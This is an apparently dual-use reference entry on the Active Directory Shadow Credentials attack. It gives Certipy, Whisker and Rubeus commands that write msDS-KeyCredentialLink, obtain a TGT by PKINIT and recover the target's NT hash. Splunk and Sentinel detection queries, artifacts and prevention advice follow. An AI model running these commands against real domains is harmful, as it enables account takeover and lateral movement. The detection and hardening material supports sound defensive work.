name: Certipy Shadow Auto - Automated Shadow Credentials Attack
description: Certipy shadow auto performs the full Shadow Credentials attack chain automatically: adds a KeyCredential to the target, requests a TGT using PKINIT, and recovers the NT hash. One command replaces the manual Whisker + Rubeus + PKINITtools chain. Works against users and computers where you have GenericWrite/GenericAll.
notes:
=== ONE-COMMAND CHAIN ===
  certipy shadow auto -u <user>@<domain> -p <pass> -account <target_account>
  # Does everything:
  # 1. Adds msDS-KeyCredentialLink to target
  # 2. Requests TGT via PKINIT with the key
  # 3. Performs UnPAC-the-hash to get NT hash
  # 4. Cleans up the KeyCredentialLink

=== MANUAL STEPS (what auto does internally) ===
  # Step 1: Add key credential
  certipy shadow add -u <user>@<domain> -p <pass> -account <target_account>
  # Step 2: Authenticate with PKINIT
  certipy shadow auth -u <user>@<domain> -p <pass> -account <target_account> -pfx <target>.pfx
  # Step 3: Remove key credential (cleanup)
  certipy shadow remove -u <user>@<domain> -p <pass> -account <target_account> -device-id <id>

=== PREREQUISITES ===
- GenericWrite or GenericAll over the target account
- ADCS deployed (for PKINIT to work)
- Target is not in Protected Users (blocks PKINIT for some configs)

=== WINDOWS EQUIVALENT ===
  # Whisker + Rubeus + PKINITtools:
  Whisker.exe add /target:<target_account>
  Rubeus.exe asktgt /user:<target_account> /certificate:<base64_cert> /password:<pass> /ptt
  # Then use the ticket

examples.label: Full automated Shadow Credentials attack
examples.command: certipy shadow auto -u jdoe@corp.local -p Password123 -account svc_admin

examples.label: Manual - add key credential
examples.command: certipy shadow add -u jdoe@corp.local -p Password123 -account svc_admin

examples.label: Cleanup - remove key credential
examples.command: certipy shadow remove -u jdoe@corp.local -p Password123 -account svc_admin -device-id <id>

recommended.note: GenericWrite is the prerequisite for Shadow Credentials.
PKINITtools getnthash is what certipy auto calls internally.

defense.why_it_works: Shadow Credentials abuse the msDS-KeyCredentialLink attribute to register a new public key for PKINIT authentication. The target account then trusts this key for Kerberos pre-authentication, allowing the attacker to obtain a TGT and recover the NT hash.
defense.prerequisites: GenericWrite/GenericAll over the target account; ADCS deployed for PKINIT.
defense.impact: Full compromise of the target account (NT hash recovery); enables pass-the-hash or further lateral movement.
defense.detection: [MITRE T1649] msDS-KeyCredentialLink modification (Event 5136); PKINIT authentication from unexpected sources.
defense.artifacts: Event 5136 showing KeyCredentialLink change; Event 4768 with PKINIT pre-auth; certificate-based TGT request.
defense.splunk_spl:
index=windows EventCode=5136 AttributeLDAPDisplayName="msDS-KeyCredentialLink"
| table _time, SubjectUserName, ObjectDN, OperationType
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "msDS-KeyCredentialLink"
| project TimeGenerated, SubjectUserName, ObjectDN, OperationType
defense.prevention: Monitor msDS-KeyCredentialLink changes; restrict GenericWrite permissions; use Protected Users group for sensitive accounts; audit PKINIT authentication events.

detections.name: Shadow Credentials - KeyCredentialLink modification
detections.logic:
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "msDS-KeyCredentialLink"
| where OperationType == "%%14674"
| project TimeGenerated, SubjectUserName, ObjectDN, OperationType
| extend TargetAccount = extract(@"CN=([^,]+)", 1, ObjectDN)
detections.false_positives: Windows Hello for Business enrollment; WHfB key provisioning
detections.tuning: Whitelist WHfB enrollment service accounts; alert on any other KeyCredentialLink modification
